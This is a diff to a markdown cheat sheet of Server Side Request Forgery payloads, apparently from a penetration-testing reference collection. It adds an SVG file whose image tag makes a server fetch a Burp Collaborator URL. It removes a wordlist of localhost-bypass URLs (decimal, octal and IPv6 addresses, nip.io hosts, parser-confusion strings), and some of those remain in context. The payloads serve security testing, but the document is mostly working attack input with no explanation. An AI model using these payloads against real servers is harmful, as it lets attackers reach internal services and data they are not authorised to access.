@@ -1,5 +1,16 @@
 # Server Side Request Forgery (SSRF)
 
+## Payloads
+
+### SSRF in SVG file
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+    <image height="200" width="200" xlink:href="http://burpcollaborator.com/image.jpeg" />
+</svg>
+```
+
 ## Localhost Bypasses
 
 ### Using \[::]
@@ -84,32 +95,6 @@ List:
 ### Against a weak parser
 
 ```csharp
-http://127.1.1.1:80\@127.2.2.2:80/
-http://127.1.1.1:80\@@127.2.2.2:80/
-http://127.1.1.1:80:\@@127.2.2.2:80/
-http://127.1.1.1:80#\@127.2.2.2:80/
-```
-
-## All Payloads - Wordlist
-
-```csharp
-http://[::]:80/
-http://0000::1:80/
-http://spoofed.burpcollaborator.net
-http://localtest.me
-http://customer1.app.localhost.my.company.127.0.0.1.nip.io
-http://127.127.127.127
-http://127.0.1.3
-http://127.0.0.0
-http://2130706433/
-http://0177.0.0.1/
-http://[0:0:0:0:0:ffff:127.0.0.1]
-localhost:+11211aaa
-localhost:00011211aaaa
-http://0/
-http://127.1
-http://127.0.1
-http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
 http://127.1.1.1:80\@127.2.2.2:80/
 http://127.1.1.1:80\@@127.2.2.2:80/
 http://127.1.1.1:80:\@@127.2.2.2:80/
